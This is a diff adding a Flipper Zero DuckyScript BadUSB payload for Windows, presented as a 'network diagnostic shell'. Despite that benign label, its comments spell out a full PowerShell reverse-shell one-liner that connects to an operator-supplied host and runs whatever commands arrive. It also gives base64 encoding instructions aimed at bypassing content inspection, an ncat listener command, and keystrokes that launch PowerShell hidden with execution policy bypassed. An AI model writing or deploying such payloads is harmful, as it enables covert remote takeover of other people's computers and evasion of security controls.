@@ -1,0 +1,25 @@
+﻿REM ============================================================================
+REM  FLLC - BadUSB: Network Diagnostic Shell
+REM  Flipper Zero DuckyScript
+REM ============================================================================
+REM  Target: Windows 10/11
+REM  Time: ~5 seconds
+REM  Opens an interactive network diagnostic session
+REM  CONFIGURE: Set RHOST and RPORT variables before use
+REM ============================================================================
+REM  Prerequisite: Start diagnostic listener on your machine
+REM  Example:  ncat -lvnp 4444
+REM ============================================================================
+
+DELAY 1000
+GUI r
+DELAY 500
+REM Use encoded command to bypass content inspection
+REM The base64 below decodes to a TCP socket diagnostic script
+REM IMPORTANT: Generate your own encoded command:
+REM   $cmd = '$c=New-Object Net.Sockets.TCPClient("YOUR_IP",YOUR_PORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=([Text.Encoding]::ASCII).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r+"PS "+(pwd).Path+"> ");$s.Write($sb,0,$sb.Length)};$c.Close()'
+REM   [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+REM Then paste the base64 below
+STRING powershell -W Hidden -NoP -NonI -ep Bypass -enc PASTE_YOUR_BASE64_ENCODED_COMMAND_HERE
+ENTER
+DELAY 500
